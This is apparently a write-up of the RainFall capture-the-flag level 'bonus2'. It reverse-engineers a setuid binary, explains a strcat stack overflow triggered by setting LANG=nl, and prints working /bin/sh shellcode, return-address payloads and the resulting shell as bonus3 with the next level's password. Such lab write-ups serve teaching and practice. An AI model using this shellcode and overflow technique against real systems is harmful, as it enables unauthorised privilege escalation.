# Bonus2

## Walkthrough

We list the files in the current home directory.

```bash
bonus2@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
bonus2@RainFall:~$ file bonus2 
bonus2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf71cccc3c27dfb47071bb0bc981e2dae92a47844, not stripped
```

The file is owned by **bonus3** and has the setuid bit.

We list the functions in the executable with **GDB**.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  memcmp
0x08048360  memcmp@plt
0x08048370  strcat
0x08048370  strcat@plt
0x08048380  getenv
0x08048380  getenv@plt
0x08048390  puts
0x08048390  puts@plt
0x080483a0  __gmon_start__
0x080483a0  __gmon_start__@plt
0x080483b0  __libc_start_main
0x080483b0  __libc_start_main@plt
0x080483c0  strncpy
0x080483c0  strncpy@plt
0x080483d0  _start
0x08048400  __do_global_dtors_aux
0x08048460  frame_dummy
0x08048484  greetuser
0x08048529  main
0x08048640  __libc_csu_init
0x080486b0  __libc_csu_fini
0x080486b2  __i686.get_pc_thunk.bx
0x080486c0  __do_global_ctors_aux
0x080486ec  _fini
```

There are 2 user defined functions: `main()` and `greetuser()`.

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048529 <+0>:     push   ebp
   0x0804852a <+1>:     mov    ebp,esp
   0x0804852c <+3>:     push   edi
   0x0804852d <+4>:     push   esi
   0x0804852e <+5>:     push   ebx
   0x0804852f <+6>:     and    esp,0xfffffff0
   0x08048532 <+9>:     sub    esp,0xa0
   0x08048538 <+15>:    cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>:    je     0x8048548 <main+31>
   0x0804853e <+21>:    mov    eax,0x1
   0x08048543 <+26>:    jmp    0x8048630 <main+263>
   0x08048548 <+31>:    lea    ebx,[esp+0x50]
   0x0804854c <+35>:    mov    eax,0x0
   0x08048551 <+40>:    mov    edx,0x13
   0x08048556 <+45>:    mov    edi,ebx
   0x08048558 <+47>:    mov    ecx,edx
   0x0804855a <+49>:    rep stos DWORD PTR es:[edi],eax
   0x0804855c <+51>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804855f <+54>:    add    eax,0x4
   0x08048562 <+57>:    mov    eax,DWORD PTR [eax]
   0x08048564 <+59>:    mov    DWORD PTR [esp+0x8],0x28
   0x0804856c <+67>:    mov    DWORD PTR [esp+0x4],eax
   0x08048570 <+71>:    lea    eax,[esp+0x50]
   0x08048574 <+75>:    mov    DWORD PTR [esp],eax
   0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804857f <+86>:    add    eax,0x8
   0x08048582 <+89>:    mov    eax,DWORD PTR [eax]
   0x08048584 <+91>:    mov    DWORD PTR [esp+0x8],0x20
   0x0804858c <+99>:    mov    DWORD PTR [esp+0x4],eax
   0x08048590 <+103>:   lea    eax,[esp+0x50]
   0x08048594 <+107>:   add    eax,0x28
   0x08048597 <+110>:   mov    DWORD PTR [esp],eax
   0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:   mov    DWORD PTR [esp],0x8048738
   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
   0x080485ab <+130>:   mov    DWORD PTR [esp+0x9c],eax
   0x080485b2 <+137>:   cmp    DWORD PTR [esp+0x9c],0x0
   0x080485ba <+145>:   je     0x8048618 <main+239>
   0x080485bc <+147>:   mov    DWORD PTR [esp+0x8],0x2
   0x080485c4 <+155>:   mov    DWORD PTR [esp+0x4],0x804873d
   0x080485cc <+163>:   mov    eax,DWORD PTR [esp+0x9c]
   0x080485d3 <+170>:   mov    DWORD PTR [esp],eax
   0x080485d6 <+173>:   call   0x8048360 <memcmp@plt>
   0x080485db <+178>:   test   eax,eax
   0x080485dd <+180>:   jne    0x80485eb <main+194>
   0x080485df <+182>:   mov    DWORD PTR ds:0x8049988,0x1
   0x080485e9 <+192>:   jmp    0x8048618 <main+239>
   0x080485eb <+194>:   mov    DWORD PTR [esp+0x8],0x2
   0x080485f3 <+202>:   mov    DWORD PTR [esp+0x4],0x8048740
   0x080485fb <+210>:   mov    eax,DWORD PTR [esp+0x9c]
   0x08048602 <+217>:   mov    DWORD PTR [esp],eax
   0x08048605 <+220>:   call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:   test   eax,eax
   0x0804860c <+227>:   jne    0x8048618 <main+239>
   0x0804860e <+229>:   mov    DWORD PTR ds:0x8049988,0x2
   0x08048618 <+239>:   mov    edx,esp
   0x0804861a <+241>:   lea    ebx,[esp+0x50]
   0x0804861e <+245>:   mov    eax,0x13
   0x08048623 <+250>:   mov    edi,edx
   0x08048625 <+252>:   mov    esi,ebx
   0x08048627 <+254>:   mov    ecx,eax
   0x08048629 <+256>:   rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   0x0804862b <+258>:   call   0x8048484 <greetuser>
   0x08048630 <+263>:   lea    esp,[ebp-0xc]
   0x08048633 <+266>:   pop    ebx
   0x08048634 <+267>:   pop    esi
   0x08048635 <+268>:   pop    edi
   0x08048636 <+269>:   pop    ebp
   0x08048637 <+270>:   ret
End of assembler dump.
```

The `main()` function:
- quits if `argc` is not equal to 3
- iterates 19 times from `[esp + 0x50]`, 4 bytes by 4 bytes, to set the bytes to 0
- calls `strncpy()` to copy up to 40 characters from `argv[1]` to `[esp + 0x50]`
- calls `strncpy()` to copy up to 32 characters from `argv[2]` to `[esp + 0x50 + 0x28]`
- calls `getenv("LANG")`and:
  - jumps to the end of the `main()` function if the environment variable is not defined
  - sets the value `1` at address `0x8049988` if the value of the environment variable is equal to `fi`
  - sets the value `2` at address `0x8049988` if the value of the environment variable is equal to `nl`
- iterates up to 19 times, 4 bytes by 4 bytes, to copy the string from `[esp + 0x50]` to the top of `esp`
- calls `greetuser()`

```
(gdb) disas greetuser
Dump of assembler code for function greetuser:
   0x08048484 <+0>:     push   ebp
   0x08048485 <+1>:     mov    ebp,esp
   0x08048487 <+3>:     sub    esp,0x58
   0x0804848a <+6>:     mov    eax,ds:0x8049988
   0x0804848f <+11>:    cmp    eax,0x1
   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
   0x08048494 <+16>:    cmp    eax,0x2
   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:    test   eax,eax
   0x0804849b <+23>:    jne    0x804850a <greetuser+134>
   0x0804849d <+25>:    mov    edx,0x8048710
   0x080484a2 <+30>:    lea    eax,[ebp-0x48]
   0x080484a5 <+33>:    mov    ecx,DWORD PTR [edx]
   0x080484a7 <+35>:    mov    DWORD PTR [eax],ecx
   0x080484a9 <+37>:    movzx  ecx,WORD PTR [edx+0x4]
   0x080484ad <+41>:    mov    WORD PTR [eax+0x4],cx
   0x080484b1 <+45>:    movzx  edx,BYTE PTR [edx+0x6]
   0x080484b5 <+49>:    mov    BYTE PTR [eax+0x6],dl
   0x080484b8 <+52>:    jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:    mov    edx,0x8048717
   0x080484bf <+59>:    lea    eax,[ebp-0x48]
   0x080484c2 <+62>:    mov    ecx,DWORD PTR [edx]
   0x080484c4 <+64>:    mov    DWORD PTR [eax],ecx
   0x080484c6 <+66>:    mov    ecx,DWORD PTR [edx+0x4]
   0x080484c9 <+69>:    mov    DWORD PTR [eax+0x4],ecx
   0x080484cc <+72>:    mov    ecx,DWORD PTR [edx+0x8]
   0x080484cf <+75>:    mov    DWORD PTR [eax+0x8],ecx
   0x080484d2 <+78>:    mov    ecx,DWORD PTR [edx+0xc]
   0x080484d5 <+81>:    mov    DWORD PTR [eax+0xc],ecx
   0x080484d8 <+84>:    movzx  ecx,WORD PTR [edx+0x10]
   0x080484dc <+88>:    mov    WORD PTR [eax+0x10],cx
   0x080484e0 <+92>:    movzx  edx,BYTE PTR [edx+0x12]
   0x080484e4 <+96>:    mov    BYTE PTR [eax+0x12],dl
   0x080484e7 <+99>:    jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:   mov    edx,0x804872a
   0x080484ee <+106>:   lea    eax,[ebp-0x48]
   0x080484f1 <+109>:   mov    ecx,DWORD PTR [edx]
   0x080484f3 <+111>:   mov    DWORD PTR [eax],ecx
   0x080484f5 <+113>:   mov    ecx,DWORD PTR [edx+0x4]
   0x080484f8 <+116>:   mov    DWORD PTR [eax+0x4],ecx
   0x080484fb <+119>:   mov    ecx,DWORD PTR [edx+0x8]
   0x080484fe <+122>:   mov    DWORD PTR [eax+0x8],ecx
   0x08048501 <+125>:   movzx  edx,WORD PTR [edx+0xc]
   0x08048505 <+129>:   mov    WORD PTR [eax+0xc],dx
   0x08048509 <+133>:   nop
   0x0804850a <+134>:   lea    eax,[ebp+0x8]
   0x0804850d <+137>:   mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+141>:   lea    eax,[ebp-0x48]
   0x08048514 <+144>:   mov    DWORD PTR [esp],eax
   0x08048517 <+147>:   call   0x8048370 <strcat@plt>
   0x0804851c <+152>:   lea    eax,[ebp-0x48]
   0x0804851f <+155>:   mov    DWORD PTR [esp],eax
   0x08048522 <+158>:   call   0x8048390 <puts@plt>
   0x08048527 <+163>:   leave
   0x08048528 <+164>:   ret
End of assembler dump.
```

The `greetuser()` function:
- checks the value stored at `0x8049988` and depending of the value, it copies either the word `"Hello "` or `"Goedemiddag! "` to `[ebp - 0x48]`
- calls `strcat()` to append the string copied to the top of the `main()` stack frame to `[ebp - 0x48]`

We draw a diagram of the stack.

![Diagram of the stack](./resources/bonus2_diagram1)

From our analysis of the ASM code, we figure out that the only way to pass this level is to overwrite the stored `eip`, with a shellcode, in the stack frame of the `greetuser()` function, with the help of `strcat()`. We calculate the difference between the address of the `dest` of `strcat()` and the `old eip` address to get the size of our payload: 88 - 16 + 4 = 76 (+ 4 bytes for the address of our shellcode).  
Thanks to the calls to `strncpy()`, we can copy up to 72 characters consecutively on the stack, which is not sufficient enough.  
But if we modify the value of the `LANG` environment variable to `nl`, the string `Goedemiddag! ` will be copied at the same address as the `dest` of `strcat()`. If we combine the size of this string with our payload, we can properly overwrite the `old eip` value.

The `Goedemiddag! ` string contains 13 characters. We subtract this number from the number we calculated earlier: 76 - 13 = 63.

First, we modify the value of the `LANG` environment variable.

```bash
bonus2@RainFall:~$ export LANG=nl
```

Then we write our shellcode in an environment variable, because like the `bonus0`, we may not be able to properly write it in 2 differents strings (and it is an easier solution).

```bash
bonus2@RainFall:~$ export SHELLCODE=$(python -c "print('\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')")
```

Now, we have to find the address of this new environment variable.

```
(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) r "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
Starting program: /home/user/bonus2/bonus2 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

Breakpoint 1, 0x0804852f in main ()
(gdb) x/48s $esp+500
[...]
0xbffff852:	 "SHELLCODE=1\300\061\333\260\006\315\200Sh/ttyh/dev\211\343\061\311f\271\022'\260\005\315\200\061\300Ph//shh/bin\211\343PS\211\341\231\260\v\315\200"
[...]
```

The address of our environment variable is `0xbffff852`. But like in `bonus0`, we have to increment it by 10 in order to target the start of the string: `0xbffff85c`.

Finally we call the executable with 2 arguments, the first being a payload of 40 characters, and the second 23 (for a total of 63 characters), followed by our shellcode address.

```bash
bonus2@RainFall:~$ ./bonus2 $(python -c "print('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')") $(python -c "print('AAAAAAAAAAAAAAAAAAAAAAA' + '\x5c\xf8\xff\xbf')")
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\���
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
